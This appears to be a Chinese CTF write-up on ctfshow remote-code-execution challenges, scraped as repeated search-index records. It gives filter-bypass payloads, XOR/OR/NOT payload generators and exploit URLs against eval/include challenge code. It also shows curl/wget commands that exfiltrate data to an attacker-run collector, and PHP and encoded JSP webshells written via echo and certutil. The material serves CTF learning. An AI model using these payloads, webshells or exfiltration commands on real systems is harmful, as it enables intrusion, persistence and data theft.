flag.php ","date":"2023-11-17","objectID":"/ctfshow_rce/:9:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#变量拼接绕过正则"},{"categories":["CTF","web"],"content":"\r输入字符串长度限制 [root@kali flag123]# cat flag flag{suifeng} [root@kali flag123]# touch \"ag\" [root@kali flag123]# touch \"fl\\\\\" [root@kali flag123]# touch \"t \\\\\" [root@kali flag123]# touch \"ca\\\\\" [root@kali flag123]# s -t ca\\ t \\ fl\\ ag shell flag [root@kali flag123]# ls -t \u003eshell [root@kali flag123]# sh shell shell: line 1: shell: command not found flag{suifeng} shell: line 6: flag: command not found [root@kali flag123]# ls ag ca\\ fl flag shell t \\ # \\指的是换行 # ls -t是将文本按时间排序输出 # ls -t \u003eshell 将输出输入到shell文件中 # sh将文本中的文字读取出来执行 ","date":"2023-11-17","objectID":"/ctfshow_rce/:10:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#输入字符串长度限制"},{"categories":["CTF","web"],"content":"\r内联执行内联执行就是在一条shell语句中内嵌子shell语句,用主shell语句处理子语句的结果 可用于内联语句的符号 ${},``（反引号） echo `ls` echo ${ls} 相当于把ls的结果使用echo输出 ","date":"2023-11-17","objectID":"/ctfshow_rce/:11:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#内联执行"},{"categories":["CTF","web"],"content":"\r“${}”截取环境变量拼接 [root@kali ~]# echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin [root@kali ~]# echo ${PATH:5:1}${PATH:2:1} ls ${PATH:14:1}${PATH:5:1} flag.txt 在此环境中相当于 nl flag.txt ","date":"2023-11-17","objectID":"/ctfshow_rce/:12:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#截取环境变量拼接"},{"categories":["CTF","web"],"content":"\r[]中括号匹配绕过 /a-c][h-j][m-o/b-da[s-u] flag.txt 相当于 /bin/cat flag.txt 因为[]匹配范围只在当前路径 所以要为bin绝对路径 ","date":"2023-11-17","objectID":"/ctfshow_rce/:13:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#中括号匹配绕过"},{"categories":["CTF","web"],"content":"\rsource命令：source命令，又称点命令,可以用点号( . ),代替 该命令可以读取并执行文件中的命令 可构建文件上传表单，上传命令文件执行 表单： \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003ePOST数据包POC\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/\" method=\"post\" enctype=\"multipart/form-data\"\u003e \u003c!--链接是当前打开的题目链接--\u003e \u003clabel for=\"file\"\u003e文件名：\u003c/label\u003e \u003cinput type=\"file\" name=\"file\" id=\"file\"\u003e\u003cbr\u003e \u003cinput type=\"submit\" name=\"submit\" value=\"提交\"\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e get请求为： ?c=.+/???/????????[@-[] 一般来说这个文件在linux下面保存在/tmp/php??????一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配） ","date":"2023-11-17","objectID":"/ctfshow_rce/:14:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#source命令"},{"categories":["CTF","web"],"content":"\r嵌套eval函数绕过 ?c=eval($_GET[a]);\u0026a=system('cat flag.php'); payload共传递了两个参数，第一个为嵌套eval第二个为向嵌套的eval传入参数 ","date":"2023-11-17","objectID":"/ctfshow_rce/:15:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#嵌套eval函数绕过"},{"categories":["CTF","web"],"content":"\r已知的其他函数拼凑所需字符串 ?c=show_source(next(array_reverse(scandir(pos(localeconv()))))); localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回数组第一个\".\" pos():输出数组第一个元素，不改变指针； scandir();遍历目录，这里因为参数为\".\"所以遍历当前目录 array_reverse():元组倒置 next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以 show_source():查看源码 使用pos(localeconv)来获取小数点 ","date":"2023-11-17","objectID":"/ctfshow_rce/:16:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#已知的其他函数拼凑所需字符串"},{"categories":["CTF","web"],"content":"\r无回显rce无回显的执行函数： exec() shell_exec() ``（反引号） 这些需要php函数echo才可以输出结果 ","date":"2023-11-17","objectID":"/ctfshow_rce/:17:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#无回显rce"},{"categories":["CTF","web"],"content":"\r复制到可访问文件 先将根目录复制到某个文件，然后访问查看 ls /| tee ls.txt 然后输入 url/1.txt 即可查看根目录 再复制flag文件，然后访问查看 cat /flag.php | tee flag.txt 然后输入 url/falg.txt 即可查看根目录 还可以使用其他的复制方法 copy /flag.php flag.txt mv /flag.php flag.txt ","date":"2023-11-17","objectID":"/ctfshow_rce/:17:1","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#复制到可访问文件"},{"categories":["CTF","web"],"content":"\rdnslog外带数据需要dnslog平台，可自己搭建 在自己的公网ip的网站目录下建立一个record.php的文件，里面写下如下代码 \u003c?php $data =$_GET['data']; $f = fopen(\"flag.txt\", \"w\"); fwrite($f,$data); fclose($f); ?\u003e 然后构造请求 curl http://*.*.*.**/record.php?data=`catflag|base64` wget http://*.*.*.*/record.php?data=`catflag|base64` 进行编码防止数据不全等问题 ","date":"2023-11-17","objectID":"/ctfshow_rce/:17:2","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#dnslog外带数据"},{"categories":["CTF","web"],"content":"\r\u003e/dev/null 2\u003e\u00261类无回显用分隔符进行分割即可绕过 ","date":"2023-11-17","objectID":"/ctfshow_rce/:17:3","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#devnull-21类无回显"},{"categories":["CTF","web"],"content":"\ruaf脚本绕过disable_function具体脚本看web72 ","date":"2023-11-17","objectID":"/ctfshow_rce/:18:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#uaf脚本绕过disable_function"},{"categories":["CTF","web"],"content":"\r无字母数字RCE","date":"2023-11-17","objectID":"/ctfshow_rce/:19:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#无字母数字rce"},{"categories":["CTF","web"],"content":"\r异或脚本生成包含所有可见字符的异或构造结果 \u003c?php $myfile = fopen(\"res.txt\", \"w\"); $contents=\"\"; for ($i=0; $i \u003c 256; $i++) { for ($j=0; $j \u003c256 ; $j++) { if($i\u003c16){ $hex_i='0'.dechex($i); } else{ $hex_i=dechex($i); } if($j\u003c16){ $hex_j='0'.dechex($j); } else{ $hex_j=dechex($j); } $preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可 if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ echo \"\"; } else{ $a='%'.$hex_i; $b='%'.$hex_j; $c=(urldecode($a)^urldecode($b)); if (ord($c)\u003e=32\u0026ord($c)\u003c=126) { $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\"; } } } } fwrite($myfile,$contents); fclose($myfile); 运行python脚本生成payload import requests import urllib from sys import * import os def action(arg): s1=\"\" s2=\"\" for i in arg: f=open(\"res.txt\",\"r\") while True: t=f.readline() if t==\"\": break if t[0]==i: #print(i) s1+=t[2:5] s2+=t[6:9] break f.close() output=\"(\\\"\"+s1+\"\\\"^\\\"\"+s2+\"\\\")\" return(output) while True: param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\"))+\";\" print(param) 运行结果 (\"%08%02%08%08%05%0d\"^\"%7b%7b%7b%7c%60%60\")(\"%04%09%09\"^\"%60%60%7b\"); 低版本可能会导致执行不成功 ","date":"2023-11-17","objectID":"/ctfshow_rce/:19:1","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#异或"},{"categories":["CTF","web"],"content":"\r或 \u003c?php $myfile = fopen(\"res.txt\", \"w\"); $contents=\"\"; for ($i=0; $i \u003c 256; $i++) { for ($j=0; $j \u003c256 ; $j++) { if($i\u003c16){ $hex_i='0'.dechex($i); } else{ $hex_i=dechex($i); } if($j\u003c16){ $hex_j='0'.dechex($j); } else{ $hex_j=dechex($j); } $preg = '/[0-9a-z]/i';//根据题目给的正则表达式修改即可 if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ echo \"\"; } else{ $a='%'.$hex_i; $b='%'.$hex_j; $c=(urldecode($a)|urldecode($b)); if (ord($c)\u003e=32\u0026ord($c)\u003c=126) { $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\"; } } } } fwrite($myfile,$contents); fclose($myfile); python脚本： import requests import urllib from sys import * import os def action(arg): s1=\"\" s2=\"\" for i in arg: f=open(\"or_rce.txt\",\"r\") while True: t=f.readline() if t==\"\": break if t[0]==i: #print(i) s1+=t[2:5] s2+=t[6:9] break f.close() output=\"(\\\"\"+s1+\"\\\"|\\\"\"+s2+\"\\\")\" return(output) while True: param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\"))+\";\" print(param) ","date":"2023-11-17","objectID":"/ctfshow_rce/:19:2","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#或"},{"categories":["CTF","web"],"content":"\r取反取反用的字符不会触发正则表达式，所以我们直接用php脚本生成payload即可 \u003c?php //在命令行中运行 fwrite(STDOUT,'[+]your function: '); $system=str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \"\", fgets(STDIN)); fwrite(STDOUT,'[+]your command: '); $command=str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \"\", fgets(STDIN)); echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');'; ?\u003e [root@kali html]# php test.php [+]your function: system [+]your command: dir [*] (~%8C%86%8C%8B%9A%92)(~%9B%96%8D)； ","date":"2023-11-17","objectID":"/ctfshow_rce/:19:3","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#取反"},{"categories":["CTF","web"],"content":"\rPHP封装协议?file=php://filter/read=convert.base64-encode/resource=config.php它可以读取对应文件源代码，得到的结果经过Base64解密后得到的是config.php源代码 ?file=php://input 写入PHP文件。它受限于allow_url_include选项。php://input可以读取没有处理过的POST数据 ?file=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=，d2VsY29tZSB0byB0aGUgempjdGY=是welcome to the zjctf。它和http://input一样都可以把一些内容写入其中。 file:///var/www/html/flag.php读取本地文件，路径要是相对路径。可用于读取web目录下的文件。 ","date":"2023-11-17","objectID":"/ctfshow_rce/:20:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#php封装协议"},{"categories":["CTF","web"],"content":"\r写入webshell确认寻找到的路径有写入权限之后，就可以开始写webshell了 ","date":"2023-11-17","objectID":"/ctfshow_rce/:21:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#写入webshell"},{"categories":["CTF","web"],"content":"\recho直接写入\rlinux echo '\u003c?php eval($_POST[2]); ?\u003e' \u003e 1.php 在Linux中，需要转义字符主要是 单引号 或者双引号 对于单引号，我们将其替换为\\47即可。 写的时候要注意题目的函数是命令执行还是代码执行 注意payload里的符号 蚁剑连接成功 windows set /p=要写的内容\u003cnul \u003e C:\\11.txt echo 要写的内容 \u003e C:\\11.txt 在windows中，批处理需要转义字符主要有 “\u0026”，“|”，“\u003c”，“\u003e”等等，转义字符为”^” 直接写入webshell一般不会成功，因为webshell中使用的某些关键符号可能被转码或屏蔽 ","date":"2023-11-17","objectID":"/ctfshow_rce/:21:1","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#echo直接写入"},{"categories":["CTF","web"],"content":"\recho直接写入\rlinux echo '\u003c?php eval($_POST[2]); ?\u003e' \u003e 1.php 在Linux中，需要转义字符主要是 单引号 或者双引号 对于单引号，我们将其替换为\\47即可。 写的时候要注意题目的函数是命令执行还是代码执行 注意payload里的符号 蚁剑连接成功 windows set /p=要写的内容 C:\\11.txt echo 要写的内容 \u003e C:\\11.txt 在windows中，批处理需要转义字符主要有 “\u0026”，“|”，“\u003c”，“\u003e”等等，转义字符为”^” 直接写入webshell一般不会成功，因为webshell中使用的某些关键符号可能被转码或屏蔽 ","date":"2023-11-17","objectID":"/ctfshow_rce/:21:1","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#linux"},{"categories":["CTF","web"],"content":"\recho直接写入\rlinux echo '\u003c?php eval($_POST[2]); ?\u003e' \u003e 1.php 在Linux中，需要转义字符主要是 单引号 或者双引号 对于单引号，我们将其替换为\\47即可。 写的时候要注意题目的函数是命令执行还是代码执行 注意payload里的符号 蚁剑连接成功 windows set /p=要写的内容 C:\\11.txt echo 要写的内容 \u003e C:\\11.txt 在windows中，批处理需要转义字符主要有 “\u0026”，“|”，“\u003c”，“\u003e”等等，转义字符为”^” 直接写入webshell一般不会成功，因为webshell中使用的某些关键符号可能被转码或屏蔽 ","date":"2023-11-17","objectID":"/ctfshow_rce/:21:1","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#windows"},{"categories":["CTF","web"],"content":"\r转换编码写入\rLinuxbase64方式写入： echo \"PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==\" | base64 -d \u003e2.php hex方式写入： hex写入与base64写入相似，在 https://www.107000.com/T-Hex/将webshell编码成hex，使用xxd命令还原 或在使用前将webshell使用xxd生成hex数据 echo '\u003c?php eval($_POST[1]); ?\u003e' |xxd -ps 然后命令注入执行 echo 3C3F706870206576616C28245F504F53545B315D293B203F3E|xxd -r -ps \u003e 3.php windows在windows中转换方法，是通过certutil进行转换。下面是base64以及hex的转换方式 certutil-Base64 echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4= \u003e 123.txt 再通过certuti进行解码 certutil -f -decode 111.txt C:\\\\111.jsp certutil-Hex echo 3c25407061676520696d706f72743d226a6176612e7574696c2e2a2c6a617661782e63727970746f2e2a2c6a617661782e63727970746f2e737065632e2a22253e3c2521636c617373205520657874656e647320436c6173734c6f616465727b5528436c6173734c6f616465722063297b73757065722863293b7d7075626c696320436c61737320672862797465205b5d62297b72657475726e2073757065722e646566696e65436c61737328622c302c622e6c656e677468293b7d7d253e3c2569662028726571756573742e6765744d6574686f6428292e657175616c732822504f53542229297b537472696e67206b3d2265343565333239666562356439323562223b73657373696f6e2e70757456616c7565282275222c6b293b43697068657220633d4369706865722e676574496e7374616e6365282241455322293b632e696e697428322c6e6577205365637265744b657953706563286b2e676574427974657328292c224145532229293b6e6577205528746869732e676574436c61737328292e676574436c6173734c6f616465722829292e6728632e646f46696e616c286e65772073756e2e6d6973632e4241534536344465636f64657228292e6465636f646542756666657228726571756573742e67657452656164657228292e726561644c696e6528292929292e6e6577496e7374616e636528292e657175616c732870616765436f6e74657874293b7d253e \u003e 111.txt 再通过certuti进行解码 certutil -decodehex 111.txt C:\\\\111.jsp ","date":"2023-11-17","objectID":"/ctfshow_rce/:21:2","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#转换编码写入"},{"categories":["CTF","web"],"content":"\r转换编码写入\rLinuxbase64方式写入： echo \"PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==\" | base64 -d \u003e2.php hex方式写入： hex写入与base64写入相似，在 https://www.107000.com/T-Hex/将webshell编码成hex，使用xxd命令还原 或在使用前将webshell使用xxd生成hex数据 echo '\u003c?php eval($_POST[1]); ?\u003e' |xxd -ps 然后命令注入执行 echo 3C3F706870206576616C28245F504F53545B315D293B203F3E|xxd -r -ps \u003e 3.php windows在windows中转换方法，是通过certutil进行转换。下面是base64以及hex的转换方式 certutil-Base64 echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4= \u003e 123.txt 再通过certuti进行解码 certutil -f -decode 111.txt C:\\\\111.jsp certutil-Hex echo 3c25407061676520696d706f72743d226a6176612e7574696c2e2a2c6a617661782e63727970746f2e2a2c6a617661782e63727970746f2e737065632e2a22253e3c2521636c617373205520657874656e647320436c6173734c6f616465727b5528436c6173734c6f616465722063297b73757065722863293b7d7075626c696320436c61737320672862797465205b5d62297b72657475726e2073757065722e646566696e65436c61737328622c302c622e6c656e677468293b7d7d253e3c2569662028726571756573742e6765744d6574686f6428292e657175616c732822504f53542229297b537472696e67206b3d2265343565333239666562356439323562223b73657373696f6e2e70757456616c7565282275222c6b293b43697068657220633d4369706865722e676574496e7374616e6365282241455322293b632e696e697428322c6e6577205365637265744b657953706563286b2e676574427974657328292c224145532229293b6e6577205528746869732e676574436c61737328292e676574436c6173734c6f616465722829292e6728632e646f46696e616c286e65772073756e2e6d6973632e4241534536344465636f64657228292e6465636f646542756666657228726571756573742e67657452656164657228292e726561644c696e6528292929292e6e6577496e7374616e636528292e657175616c732870616765436f6e74657874293b7d253e \u003e 111.txt 再通过certuti进行解码 certutil -decodehex 111.txt C:\\\\111.jsp ","date":"2023-11-17","objectID":"/ctfshow_rce/:21:2","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#linux-1"},{"categories":["CTF","web"],"content":"\r转换编码写入\rLinuxbase64方式写入： echo \"PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==\" | base64 -d \u003e2.php hex方式写入： hex写入与base64写入相似，在 https://www.107000.com/T-Hex/将webshell编码成hex，使用xxd命令还原 或在使用前将webshell使用xxd生成hex数据 echo '\u003c?php eval($_POST[1]); ?\u003e' |xxd -ps 然后命令注入执行 echo 3C3F706870206576616C28245F504F53545B315D293B203F3E|xxd -r -ps \u003e 3.php windows在windows中转换方法，是通过certutil进行转换。下面是base64以及hex的转换方式 certutil-Base64 echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4= \u003e 123.txt 再通过certuti进行解码 certutil -f -decode 111.txt C:\\\\111.jsp certutil-Hex echo 3c25407061676520696d706f72743d226a6176612e7574696c2e2a2c6a617661782e63727970746f2e2a2c6a617661782e63727970746f2e737065632e2a22253e3c2521636c617373205520657874656e647320436c6173734c6f616465727b5528436c6173734c6f616465722063297b73757065722863293b7d7075626c696320436c61737320672862797465205b5d62297b72657475726e2073757065722e646566696e65436c61737328622c302c622e6c656e677468293b7d7d253e3c2569662028726571756573742e6765744d6574686f6428292e657175616c732822504f53542229297b537472696e67206b3d2265343565333239666562356439323562223b73657373696f6e2e70757456616c7565282275222c6b293b43697068657220633d4369706865722e676574496e7374616e6365282241455322293b632e696e697428322c6e6577205365637265744b657953706563286b2e676574427974657328292c224145532229293b6e6577205528746869732e676574436c61737328292e676574436c6173734c6f616465722829292e6728632e646f46696e616c286e65772073756e2e6d6973632e4241534536344465636f64657228292e6465636f646542756666657228726571756573742e67657452656164657228292e726561644c696e6528292929292e6e6577496e7374616e636528292e657175616c732870616765436f6e74657874293b7d253e \u003e 111.txt 再通过certuti进行解码 certutil -decodehex 111.txt C:\\\\111.jsp ","date":"2023-11-17","objectID":"/ctfshow_rce/:21:2","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#windows-1"},{"categories":["CTF","web"],"content":"\r靶场题目：","date":"2023-11-17","objectID":"/ctfshow_rce/:22:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#靶场题目"},{"categories":["CTF","web"],"content":"\r[web29] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 00:26:48 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } http://96a7197f-4b7a-43d0-90d4-2d4dee96ae95.challenge.ctf.show/?c=system('ls /'); http://96a7197f-4b7a-43d0-90d4-2d4dee96ae95.challenge.ctf.show/?c=system('ls /var/www/html/'); 由于flag字符串被过滤了，正则当中i用来不区分大小写，则可以构造 http://96a7197f-4b7a-43d0-90d4-2d4dee96ae95.challenge.ctf.show/?c=system('tac /var/www/html/fla*.php'); ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:1","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web29"},{"categories":["CTF","web"],"content":"\r[web30] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 00:42:26 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|system|php/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } system被过滤，可通过编码绕过，如escape ascii with hex 构造url如下： http://b944f8f2-1f79-425e-a724-3be899d1b02c.challenge.ctf.show/?c=\"\\163\\171\\163\\164\\145\\155\"('ls /'); http://b944f8f2-1f79-425e-a724-3be899d1b02c.challenge.ctf.show/?c=\"\\163\\171\\163\\164\\145\\155\"('tac /var/www/html/fla*.ph*'); ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:2","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web30"},{"categories":["CTF","web"],"content":"\r[web31] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 00:49:10 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } 通过嵌套eval来绕过 http://d7fd57e8-f61b-48fb-90b9-457bc707aae9.challenge.ctf.show/?c=eval($_GET[1]);\u00261=system('tac /var/www/html/flag.php'); ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:3","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web31"},{"categories":["CTF","web"],"content":"\r[web32~web36] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 00:56:31 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } 这次括号也被过滤了，include可以不用括号，分号可以用?\u003e代替 http://15871fe9-df00-4f7b-8e90-3e2b3618b395.challenge.ctf.show/?c=include$_GET[a]?\u003e\u0026a=php://filter/read=convert.base64-encode/resource=flag.php 然后base64解码即可得到flag内容 (web32~web36都可以用此payload) ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:4","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web32web36"},{"categories":["CTF","web"],"content":"\r[web37]文件包含 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 05:18:55 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ //flag in flag.php error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag/i\", $c)){ include($c); echo $flag; } }else{ highlight_file(__FILE__); } 使用data伪协议(由于过滤了flag使用占位符) ?c=data://text/plain, http://20afd377-c254-4c83-9656-761eccc0bda5.challenge.ctf.show/?c=data://text/palin,\u003c?php system('tac fla?.php');?\u003e ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:5","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web37文件包含"},{"categories":["CTF","web"],"content":"\r[web38] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 05:23:36 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ //flag in flag.php error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|php|file/i\", $c)){ include($c); echo $flag; } }else{ highlight_file(__FILE__); } 多过滤了php和file，可以继续使用data协议不过是base64编码或者用\u003c?= ?\u003e来代替php http://3db62a04-22a9-4cf4-8990-684d55c8e05e.challenge.ctf.show/?c=data://text/palin,\u003c?=system('tac fla?.???');?\u003e ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:6","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web38"},{"categories":["CTF","web"],"content":"\r[web39] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 06:13:21 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ //flag in flag.php error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag/i\", $c)){ include($c.\".php\"); } }else{ highlight_file(__FILE__); } 在文件包含的时候会在后边加.php，使用web38的payload后边加上//就可以了 